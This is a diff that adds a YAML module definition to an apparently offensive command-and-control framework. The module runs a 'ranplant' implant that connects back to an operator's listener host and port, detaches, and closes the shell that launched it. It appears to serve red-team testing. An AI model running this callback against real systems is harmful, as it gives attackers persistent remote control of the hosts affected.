@@ -1,0 +1,29 @@
+name: Start Ranplant Session
+description: Establishes a structured Ranplant session, then supersedes and closes the source session
+tactic: Execution
+techniques: ["Command and Scripting Interpreter: Unix Shell"]
+parameters:
+  LISTENER_REF:
+    type: Listener
+    required: true
+    description: active listener whose host and port ground the callback destination
+  LISTENER:
+    type: string
+    default: ${LISTENER}
+    description: callback host derived from LISTENER_REF unless explicitly supplied
+  LISTENER_PORT:
+    type: int
+    default: ${LISTENER_PORT}
+    description: callback port derived from LISTENER_REF unless explicitly supplied
+procedures:
+  - key: native
+    tool: ranplant
+    description: Ranplant completes its handshake before Ran closes the shell that launched it
+    command: >-
+      ranplant connect --host "${LISTENER}" --port "${LISTENER_PORT}" --detach
+    operation:
+      type: start-ranplant-session
+      listener_port: ${LISTENER_PORT}
+preconditions:
+  kind: System
+  accessLevel: user-exec
